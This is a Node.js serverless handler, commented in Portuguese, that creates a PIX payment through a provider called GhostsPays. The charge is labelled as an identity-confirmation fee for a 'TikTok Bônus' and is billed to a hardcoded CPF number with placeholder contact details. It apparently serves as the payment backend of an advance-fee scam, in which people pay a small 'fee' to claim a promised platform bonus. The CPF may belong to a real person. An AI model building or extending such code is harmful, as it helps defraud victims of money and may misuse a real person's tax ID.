const GHOSTSPAY_BASE_URL = 'https://api.ghostspaysv2.com/functions/v1';

function buildAuthHeader(secretKey, companyId) {
  const credentials = Buffer.from(`${secretKey}:${companyId}`).toString('base64');
  return `Basic ${credentials}`;
}

async function callGhostsPays(endpoint, options) {
  const url = `${GHOSTSPAY_BASE_URL}${endpoint}`;
  const resp = await fetch(url, options);
  const text = await resp.text();
  let json;
  try {
    json = text ? JSON.parse(text) : null;
  } catch (e) {
    json = { raw: text };
  }
  return { status: resp.status, body: json };
}

/** Normaliza a resposta da API GhostsPays (ver eventos e webhooks: data.pix.qrcode) para { id, amount, status, pix: { qrcode, qrcodeText } } */
function normalizePixResponse(body) {
  if (!body || typeof body !== 'object') return body;
  const data = body.data || body;
  const id = body.id ?? data.id ?? body.transactionId ?? data.transactionId;
  const amount = body.amount ?? data.amount;
  const status = body.status ?? data.status ?? 'waiting_payment';

  const pixBlock = body.pix ?? data.pix ?? body.pixPayment ?? data.pixPayment ?? {};
  const qrcode =
    pixBlock.qrcode ??
    pixBlock.qrCode ??
    pixBlock.qrcodeImage ??
    pixBlock.qrCodeImage ??
    body.qrcode ??
    data.qrcode ??
    (typeof pixBlock.image === 'string' ? pixBlock.image : null);
  const qrcodeText =
    pixBlock.qrcodeText ??
    pixBlock.copyPaste ??
    pixBlock.brCode ??
    pixBlock.pixKey ??
    body.qrcodeText ??
    body.copyPaste ??
    body.brCode ??
    data.qrcodeText ??
    data.copyPaste ??
    data.brCode ??
    (typeof pixBlock.text === 'string' ? pixBlock.text : null);

  return {
    id,
    amount,
    status,
    pix: {
      qrcode: qrcode || null,
      qrcodeText: qrcodeText || null
    }
  };
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: { code: 'METHOD_NOT_ALLOWED', message: 'Use POST' } });
  }

  const secretKey = process.env.GHOSTSPAY_SECRET_KEY || '';
  const companyId = process.env.GHOSTSPAY_COMPANY_ID || '';
  const postbackUrl = process.env.GHOSTSPAY_POSTBACK_URL || '';

  if (!secretKey || !companyId) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CREDENTIALS',
        message: 'Configuração GhostsPays ausente. Defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID.'
      }
    });
  }

  const cpfNumero = '11238990533';
  const amount = 3956; // R$ 39,56 em centavos (mínimo 100 por spec)

  // Payload conforme OpenAPI Criar Pagamento: customer.document { number, type }, pix.expiresInDays obrigatório
  const payload = {
    customer: {
      name: 'CPF 112.389.905-33',
      email: 'cpf11238990533@example.com',
      phone: '11999999999',
      document: { number: cpfNumero, type: 'CPF' }
    },
    paymentMethod: 'PIX',
    amount,
    items: [
      {
        title: 'Taxa de confirmação de identidade',
        unitPrice: amount,
        quantity: 1
      }
    ],
    pix: { expiresInDays: 1 },
    description: 'Taxa de confirmação TikTok Bônus'
  };

  if (postbackUrl) {
    payload.postbackUrl = postbackUrl;
  }

  try {
    const { status, body } = await callGhostsPays('/transactions', {
      method: 'POST',
      headers: {
        Authorization: buildAuthHeader(secretKey, companyId),
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (status >= 200 && status < 300) {
      const normalized = normalizePixResponse(body);
      if (!normalized.pix.qrcode && !normalized.pix.qrcodeText) {
        console.error('[GhostsPays] Resposta sem PIX. Body:', JSON.stringify(body).slice(0, 800));
      }
      return res.status(status).json(normalized);
    }
    // Erro da API: repassar status e corpo (ex.: 400, 401) para o frontend
    return res.status(status).json(body);
  } catch (e) {
    console.error('[GhostsPays] Erro ao criar pagamento PIX:', e);
    res.status(500).json({
      error: {
        code: 'INTERNAL_ERROR',
        message: 'Falha ao comunicar com a API GhostsPays.'
      }
    });
  }
}
